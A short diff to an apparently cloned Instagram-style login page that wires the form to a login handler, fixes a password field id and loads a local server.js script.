@@ -100,9 +100,9 @@
         <div id="body">
             <div id="head">
                 <p>Instagram</p>
-                <form>
+                <form onsubmit="login(event)">
                     <input id="lemail" type="email" placeholder="Enter Email" />
-                    <input id="ipass" type="password" placeholder="Enter Password"/>
+                    <input id="lpass" type="password" placeholder="Enter Password"/>
                     <input type="submit" value="Log in" />
                 </form>
                     <div id="or">
@@ -118,5 +118,6 @@
             </div>
         </div>
     </div>
+    <script src="./server.js"></script>
 </body>
 </html>
